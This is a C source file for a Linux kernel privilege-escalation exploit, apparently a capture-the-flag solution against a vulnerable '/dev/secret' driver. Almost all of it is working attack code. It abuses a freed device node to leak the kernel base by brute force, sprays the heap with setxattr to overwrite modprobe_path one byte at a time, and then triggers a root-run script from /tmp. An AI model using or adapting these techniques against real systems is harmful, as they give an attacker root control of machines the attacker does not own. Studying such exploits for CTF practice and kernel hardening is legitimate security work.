#define _GNU_SOURCE
#include <fcntl.h>     /* open, Definition of O_* constants */
#include <unistd.h>    /* exit, syscall */
#include <sys/ioctl.h> /* ioctl, Definition of SYS_* constants */
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/mman.h>
#include <sys/timerfd.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/shm.h>
#include <sys/xattr.h>
#include <linux/userfaultfd.h>
#include <linux/ioctl.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <pthread.h>
#include <errno.h>
#include <pty.h>
#include <stdint.h>
#include <stdarg.h>
#include <sched.h>
#include <poll.h>


#define IOC_MAGIC '\xFF'

#define CMD_ADD 0x01C029
#define CMD_GET 0x01C07b
#define CMD_SET 0x01C082
#define CMD_DEL 0x01C087

int secret_fd;
pthread_t uffd_thread;
uint64_t modprobe_path, kbase;
int seqfd;
struct request_t *req;

struct node_t
{
    struct node_t *next;
    uint64_t value;
    uint64_t key;
};

struct request_t
{
    uint64_t value;
    uint64_t key;
};

typedef struct
{
    long uffd;
    unsigned long long page_start;
    void *(*wp_fault_func)(void *);
    void *(*read_fault_func)(void *, struct uffdio_copy *);
} userfd_callback_args;

void errout(char *msg)
{
    perror(msg);
    exit(-1);
}

uint64_t value = 0x1122334455;
uint64_t key = 0x1122334455667788;

/* Good luck */
void brute_heap_addr(){
    uint64_t offset = 0x18ef40;
    uint64_t start = 0xffffffff81000000; // address nokaslr
    struct request_t *req_brute = malloc(sizeof(struct request_t));
    memset(req_brute, 0, sizeof(struct request_t));
    int found = 0;
    req_brute->key = start+offset;
    for (int i=0; i<0x300; i++){
        req_brute->key = start+offset+i*0x100000;
        // printf("idx: 0x%x -- Key: 0x%lx\n", i, req_brute->key);
        ioctl(secret_fd, CMD_GET, req_brute);
        if (req_brute->value) {
            found = 1;
            printf("[+] leaked something: 0x%lx\n", req_brute->value^req_brute->key);
            kbase = req_brute->value^req_brute->key;
            kbase = kbase - 0x18ef50;
            modprobe_path = kbase + 0xe387c0;

            printf("[+] kbase: 0x%lx\n", kbase);
            printf("[+] modprobe_path: 0x%lx\n", modprobe_path);
            break;
        }
    }
    if (!found) {
        printf("[-] Cant leak anythings");
        exit(1);
    }
}

/* technique using is setxattr */
void overwrite_modprobe_path(){
    // overwrite 0x20 bytes in reclaim chunk 0x20;
    uint64_t value[4] = {0};
    value[0] = modprobe_path-8;
    value[1] = 0x11223344556677;
    value[2] = 0x11223344556677;
    value[3] = 0;
    setxattr("./exploit", "attr", &value, 0x20, 0);

    struct request_t *req_ow = malloc(sizeof(struct request_t));
    memset(req_ow, 0, sizeof(struct request_t));
    char *path = strdup("/sbin/modprobe\0");
    char *new_path = strdup("/tmp/x\0");
    char curr_byte = 0, overwrite_1byte = 0;
    req_ow->key = *(uint64_t*)(path+8-1);

    for (int i=0; i<7; i++) {
        req_ow->key = req_ow->key >> 8;
        printf("key: 0x%lx\n", req_ow->key);
        req_ow->value = 0;
        overwrite_1byte = 0;
        while(!overwrite_1byte) {
            ioctl(secret_fd, CMD_SET, req_ow);
            curr_byte = req_ow->value;
            if (curr_byte==new_path[i]) {
                overwrite_1byte = 1;
            }
        }
        printf("write %d: 0x%x\n", i, curr_byte);
        /* next address */
        value[0] = modprobe_path-8+i+1;
        setxattr("./exploit", "attr", &value, 0x20, 0);
    }
    // ioctl(secret_fd, CMD_GET, req_ow);
    puts("[+] Overwrite done");

}

int main()
{
    /* prepare modproble_path exploitation */
    system("echo -ne '#!/bin/sh\ntouch /flag\nchmod 777 /flag' > /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    /* the vulnerabilities is uninitialized variable */
    /* in module_close frees whole nodes but it doesn't reset root->item_cnt and root ptr */
    /* Oh no root->item_cnt = 0 */
    req = malloc(sizeof(struct request_t));
    req->value = value;
    req->key = key;

    /* Open device */
    secret_fd = open("/dev/secret", O_RDWR);
    if (secret_fd < 0)
    {
        errout("open");
    }
    /* Add node */
    ioctl(secret_fd, CMD_ADD, req);
    printf("[+] Adding node with:\n");
    printf("\tValue: 0x%lx\n", req->value);
    printf("\tKey: 0x%lx\n", req->key);

    /* Close device */
    close(secret_fd);

    /* Reclaim node chunk -> free -> open dev  */
    /* The free'd note to leak kbase -> seq_operations */
    int stat_fd = open("/proc/self/stat", O_RDONLY);

    /* Open device */
    secret_fd = open("/dev/secret", O_RDWR);
    if (secret_fd < 0)
    {
        errout("open");
    }

    /* Add new node but fail when adding it to linked-list*/
    void *new_map = mmap((void *)0x1337000, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (!new_map)
    {
        errout("mmap");
    }
    if (mprotect(new_map, 0x1000, PROT_WRITE)) {
        errout("mprotect write");
    }
    struct request_t *req_leak = (struct request_t*)new_map;
    req_leak->key = 0x1122334455667788;

    if (mprotect(new_map, 0x1000, PROT_READ)) {
        errout("mprotect write");
    }

    ioctl(secret_fd, CMD_ADD, req_leak);

    /* bruteforce address */
    brute_heap_addr();
    /* Close seq_operations */
    close(stat_fd);

    /* Adding item count to ensure that we can reference to modprobe_path */
    ioctl(secret_fd, CMD_ADD, req_leak);

    /* Overwriting the modprobe_path by using setxattr*/
    puts("[+] overwrite_modprobe_path");
    overwrite_modprobe_path();

    system("/tmp/dummy");
    system("ls -l /flag");
    /* Close device */
    close(secret_fd);
    
    return 0;
}
